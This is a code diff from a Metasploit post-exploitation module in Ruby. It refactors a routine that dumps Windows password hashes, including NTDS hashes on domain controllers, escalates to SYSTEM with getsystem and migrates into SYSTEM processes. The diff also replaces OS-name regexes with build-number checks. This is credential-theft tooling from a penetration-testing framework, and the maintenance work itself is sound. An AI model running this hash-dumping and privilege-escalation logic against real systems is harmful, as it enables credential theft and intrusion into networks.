@@ -384,20 +384,6 @@ class MetasploitModule < Msf::Post
   end
   #-------------------------------------------------------------------------------
 
-  # Function for checking if target is a DC
-  def is_dc?
-    is_dc_srv = false
-    serviceskey = 'HKLM\\SYSTEM\\CurrentControlSet\\Services'
-    if registry_enumkeys(serviceskey).include?('NTDS')
-      if registry_enumkeys(serviceskey + '\\NTDS').include?('Parameters')
-        print_good("\tThis host is a Domain Controller!")
-        is_dc_srv = true
-      end
-    end
-    return is_dc_srv
-  end
-  #-------------------------------------------------------------------------------
-
   # Function to migrate to a process running as SYSTEM
   def move_to_sys
     # Make sure you got the correct SYSTEM Account Name no matter the OS Language
@@ -426,19 +412,22 @@ class MetasploitModule < Msf::Post
   #-------------------------------------------------------------------------------
 
   def smart_hash_dump(migrate_system, pwdfile)
-    domain_controller = is_dc?
+    domain_controller = domain_controller?
+    print_good('Host is a Domain Controller') if domain_controller
+
     if !is_uac_enabled? || is_admin?
       print_status('Dumping password hashes...')
+      version = get_version_info
       # Check if Running as SYSTEM
       if is_system?
         # For DC's the registry read method does not work.
         if domain_controller
           begin
             file_local_write(pwdfile, inject_hashdump)
-          rescue ::Exception => e
+          rescue ::Exception
             print_error('Failed to dump hashes as SYSTEM, trying to migrate to another process')
 
-            if sysinfo['OS'] =~ /Windows (2008|2012)/i
+            if version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2012_R2) && version.windows_server?
               move_to_sys
               file_local_write(pwdfile, inject_hashdump)
             else
@@ -453,62 +442,57 @@ class MetasploitModule < Msf::Post
         end
 
         # Check if not running as SYSTEM
-      else
+      elsif domain_controller
 
         # Check if Domain Controller
-        if domain_controller
-          begin
-            file_local_write(pwdfile, inject_hashdump)
-          rescue StandardError
-            if migrate_system
-              print_status('Trying to get SYSTEM privilege')
-              results = session.priv.getsystem
-              if results[0]
-                print_good('Got SYSTEM privilege')
-                if session.sys.config.sysinfo['OS'] =~ /Windows (2008|2012)/i
-                  # Migrate process since on Windows 2008 R2 getsystem
-                  # does not set certain privilege tokens required to
-                  # inject and dump the hashes.
-                  move_to_sys
-                end
-                file_local_write(pwdfile, inject_hashdump)
-              else
-                print_error('Could not obtain SYSTEM privileges')
+        begin
+          file_local_write(pwdfile, inject_hashdump)
+        rescue StandardError
+          if migrate_system
+            print_status('Trying to get SYSTEM privilege')
+            results = session.priv.getsystem
+            if results[0]
+              print_good('Got SYSTEM privilege')
+              if version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2012_R2) && version.windows_server?
+                # Migrate process since on Windows 2008 R2 getsystem
+                # does not set certain privilege tokens required to
+                # inject and dump the hashes.
+                move_to_sys
               end
-            else
-              print_error('Could not get NTDS hashes!')
-            end
-          end
-        elsif sysinfo['OS'] =~ /Windows (7|8|2008|2012|Vista)/i
-          if migrate_system
-            print_status('Trying to get SYSTEM privilege')
-            results = session.priv.getsystem
-            if results[0]
-              print_good('Got SYSTEM privilege')
-              file_local_write(pwdfile, read_hashdump)
-            else
-              print_error('Could not obtain SYSTEM privilege')
-            end
-          else
-            print_error('On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes')
-            print_error('Try setting GETSYSTEM to true.')
-          end
-
-        else
-          if migrate_system
-            print_status('Trying to get SYSTEM privilege')
-            results = session.priv.getsystem
-            if results[0]
-              print_good('Got SYSTEM privilege')
-              file_local_write(pwdfile, read_hashdump)
+              file_local_write(pwdfile, inject_hashdump)
             else
               print_error('Could not obtain SYSTEM privileges')
             end
           else
-            file_local_write(pwdfile, inject_hashdump)
+            print_error('Could not get NTDS hashes!')
           end
-
         end
+      elsif version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win81)
+        if migrate_system
+          print_status('Trying to get SYSTEM privilege')
+          results = session.priv.getsystem
+          if results[0]
+            print_good('Got SYSTEM privilege')
+            file_local_write(pwdfile, read_hashdump)
+          else
+            print_error('Could not obtain SYSTEM privilege')
+          end
+        else
+          print_error('On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes')
+          print_error('Try setting GETSYSTEM to true.')
+        end
+
+      elsif migrate_system
+        print_status('Trying to get SYSTEM privilege')
+        results = session.priv.getsystem
+        if results[0]
+          print_good('Got SYSTEM privilege')
+          file_local_write(pwdfile, read_hashdump)
+        else
+          print_error('Could not obtain SYSTEM privileges')
+        end
+      else
+        file_local_write(pwdfile, inject_hashdump)
 
       end
     else
